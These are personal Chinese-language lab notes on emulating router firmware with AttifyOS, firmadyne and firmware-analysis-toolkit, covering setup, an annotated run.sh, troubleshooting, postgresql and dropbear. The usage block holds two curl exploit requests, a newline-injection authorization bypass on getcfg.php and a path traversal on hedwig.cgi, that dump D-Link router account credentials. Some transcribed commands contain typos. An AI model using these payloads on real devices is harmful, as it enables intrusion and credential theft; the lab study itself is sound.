# AttifyOS

## firmadyne

user:root  password:root

user: iot  password:attify

>firmadyne基本目录结构
>
>/binaries,存储kernel等
>
>/scripts,存储自动化的脚本
>
>./firmadyne,存储基本的变量和创建qemu指令的函数
>
>/images,生成的镜像
>
>/scratch/number,存储生成的一键运行脚本和image.raw。

##### 使用流程

```
#删除以前的image
cd /home/iot/tools/firmware-analysis-toolkit
./reset.py

#创建并启动firm
sudo ./fat.py DIR-645_FIRMWARE_1.03.ZIP  --qemu 2.5.0
sudo ./fat.py DIR-850L_REVA_FIRMWARE_1.14.B07_WW.ZIP
#非初次启动
./firmadyne/scratch/1/run.sh
#若失败
#关闭qemu进程，删除tap网卡设备
ps -aux|grep qemu
tunctl -d name
#645,850验证
curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://192.168.0.1/getcfg.php"
curl -d '<?xml version="1.0" encoding="utf-8"?><postxml><module><service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service></module></postxml>' -b "uid=demo" -H "Content-Type: text/xml" "http://VictimIp:8080/hedwig.cgi"

ifconfig 
sudo /home/iot/tools/firmware-analysis-toolkit/firmadyne/scripts/inferNetwork.sh '2' 'mipseb'

#ip和tunctl命令
sudo tunctl -d name
ifconfig eth0 192.168.1.56 netmask 255.255.255.0 broadcast 192.168.1.255
ip addr add 192.  dev wlan
ip addr shwo wlan
ip addr del 192. dev wlan
ip route show
ip route get 192
ip route add default via 192
ip route -n

#设置到达10网段经过网关
ip route add 10.0.0/24 via 193.233.7.65
#经过10网段，经过此设备
ip route chg 10.0.0/24 dev dummy

df -h
fdisk -l
fdisk  /dev/sda

curl -d "SERVICES=DEVICE.ACCOUNT&attack=ture%0aAUTHORIZED_GROUP=1" "http://192.168.0.1:8080/getcfg.php"
```





##### run.sh

```
#!/bin/bash
#忽略不存在变量
set -u

ARCHEND=mipseb
IID=6
#加载配置文件
if [ -e ./firmadyne.config ]; then
    source ./firmadyne.config
elif [ -e ../firmadyne.config ]; then
    source ../firmadyne.config
elif [ -e ../../firmadyne.config ]; then
    source ../../firmadyne.config
else
    echo "Error: Could not find 'firmadyne.config'!"
    exit 1
fi
#脚本函数都在firmadyne.config中
#get_fs获取image.raw
IMAGE=`get_fs ${IID}`
#根据ARCHEND到binaries中找对应架构内核，对应关系为，armel:zImage.armel,mipseb:vmlinux.mipseb,mipsel:vmlinux.mipsel
KERNEL=`get_kernel ${ARCHEND}`
#生成对应qemu指令,对应关系：armel:qemu-system.arm,mipseb:qemu-system-mips,mipsel:qemu-system-mipsel
QEMU=`get_qemu ${ARCHEND}`
#生成qemu使用的开发板类型
QEMU_MACHINE=`get_qemu_machine ${ARCHEND}`
#生成qemu虚拟机的根文件系统路径，对应为，armel:/dve/vda1,mipseb:/dev/sda1,mipsel:/dev/sda1
QEMU_ROOTFS=`get_qemu_disk ${ARCHEND}`
#获取scratch子级目录
WORK_DIR=`get_scratch ${IID}`


TAPDEV_0=tap${IID}_0
HOSTNETDEV_0=${TAPDEV_0}
echo "Creating TAP device ${TAPDEV_0}..."
#创建tun/tap设备，指定设备名称和拥有者
sudo tunctl -t ${TAPDEV_0} -u ${USER}


echo "Bringing up TAP device..."
#启动tun/tap设备
sudo ip link set ${HOSTNETDEV_0} up
#为tun/tap设备增加地址
sudo ip addr add 192.168.0.99/24 dev ${HOSTNETDEV_0}

echo "Adding route to 192.168.0.100..."
#增加新路由
sudo ip route add 192.168.0.100 via 192.168.0.100 dev ${HOSTNETDEV_0}

#杀死当前shell进程
function cleanup {
  pkill -P $$

echo "Deleting route..."
删除tun/tap设备所有路由信息
sudo ip route flush dev ${HOSTNETDEV_0}

echo "Bringing down TAP device..."
#关闭tum/tap设备
sudo ip  set ${TAPDEV_0} down


echo "Deleting TAP device ${TAPDEV_0}..."
#删除设备
sudo tunctl -d ${TAPDEV_0}

}
#收到EXIT信号后，执行cleanup
trap cleanup EXIT

echo "Starting firmware emulation... use Ctrl-a + x to exit"
sleep 1s
#-m,指定内存空间，-M 指定开发板，-kernel 指定内核镜像，-nographic 不使用图形化
${QEMU} -m 256 -M ${QEMU_MACHINE} -kernel ${KERNEL} \
    -drive if=ide,format=raw,file=${IMAGE} -append "root=${QEMU_ROOTFS} console=ttyS0 nandsim.parts=64,64,64,64,64,64,64,64,64,64 rdinit=/firmadyne/preInit.sh rw debug ignore_loglevel print-fatal-signals=1 user_debug=31 firmadyne.syscall=0" \
    -nographic \
    -netdev tap,id=net0,ifname=${TAPDEV_0},script=no -device e1000,netdev=net0 -netdev socket,id=net1,listen=:2001 -device e1000,netdev=net1 -netdev socket,id=net2,listen=:2002 -device e1000,netdev=net2 -netdev socket,id=net3,listen=:2003 -device e1000,netdev=net3 | tee ${WORK_DIR}/qemu.final.serial.log

```

### problem

##### qemu-system-mipsel: -netdev tap,id=net0,ifname=tap1_0,script=no: Duplicate ID 'net0' for netdev

```
vim firmadyne/scratch/1/run.sh
修改重复的net0
./run.sh
```



### systemtap

>systemtap：https://blog.csdn.net/yunlianglinfeng/article/details/40536843
>
>qemu-image：https://www.cnblogs.com/pengdonglin137/p/5023342.html 

```
开发板，kernel，image，rootfs
编译内核，带工具的文件系统
Target system consists of self-built Linux kernel and prepared filesystem with analysis tools. In orderto cross-compile images, buildroot8project was used.Buildroot is a common tool that helps to develop Linuxfor embedded systems.
编译内核使得可以追踪，-g标志
If we want to usefull functionality of SystemTap, it is needed to compilekernel with multiple flags to enable tracing and debugsymbols.  Moreover, everything has to be compiledwith -g flag.
```



##### problem



### fat

https://blog.csdn.net/song_lee/article/details/104393933
https://github.com/liyansong2018/Old-Firmware-Analysis-Toolkit
18.04
错误：pexpect.exceptions.EOF: End Of File (EOF). Exception style platform.
command: /home/cuckoo/download/Old-Firmware-Analysis-Toolkit-master/firmadyne/scripts/getArch.shargs: ['/home/cuckoo/download/Old-Firmware-Analysis-Toolkit-master/firmadyne/scripts/[getArch.sh](http://getarch.sh/)', './images/1.tar.gz']buffer (last 100 chars): ''before (last 100 chars): ''after: match: Nonematch_index: Noneexitstatus: Noneflag_eof: Truepid: 9973child_fd: 5closed: Falsetimeout: 30delimiter: logfile: Nonelogfile_read: Nonelogfile_send: Nonemaxread: 2000ignorecase: Falsesearchwindowsize: Nonedelaybeforesend: 0.05delayafterclose: 0.1delayafterterminate: 0.1searcher: searcher_re:    0: re.compile('Password for user firmadyne: ')

##### 键值重复

删除该表所有data

##### 连接失败

pg_hba.conf全设trust

### lob/docker

https://github.com/firmadyne/firmadyne
image那一步，说无法kernel通信。类似这个：https://github.com/firmadyne/firmadyne/issues/21
错误：
/dev/mapper/control: open failed: Operation not permitted
Failure to communicate with kernel device-mapper driver.
Check that device-mapper is available in the kernel.
device mapper prerequisites not met
​

##### temp

/home/cuckoo/[WNAP320.zip](http://wnap320.zip/)
几个组件，extrctor，binwalk，postgredql，qemu。

### postgresql

\l  显示database
\d 显示表格关系
\d tabelname ,show table info
\c databasename 进入数据库
sudo -u postgres psql 进入psql
\q ,exit
service postgresql start
​
分号必须隔一个空格。

##### 增删改查

sudo insert  tablename columns()  values();
delete from tablename where a=b;
UPDATE table_name
SET column1 = value1, column2 = value2...., columnN = valueN
WHERE [condition];

select * from tablename;

**dropbear**

安装

```
下载
tar xzf dropbear
cd dropbear
cat INSTALL
./configure --prefix=/usr/local/dropbear/ --sysconfdir=/etc/dropbear/
make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp"
sudo make PROGRAMS="dropbear dbclient dropbearkey dropbearconvert scp" install   
```

开启服务端

```
dropbear -E -p 222
```



连接服务端

```
sudo apt-get update -y
sudo apt-get install dropbear -y
sudo apt-get install libc6,zlib1g,openssh-client,runit,udev,xauth
```

```
dbclient admin@192.168.0.100
password

/etc/init.d/dropbear restart
```

**dropbear的scp**

```
cd $dropbear_home
./scp test.txt admin@router:/home
password
```

run.sh

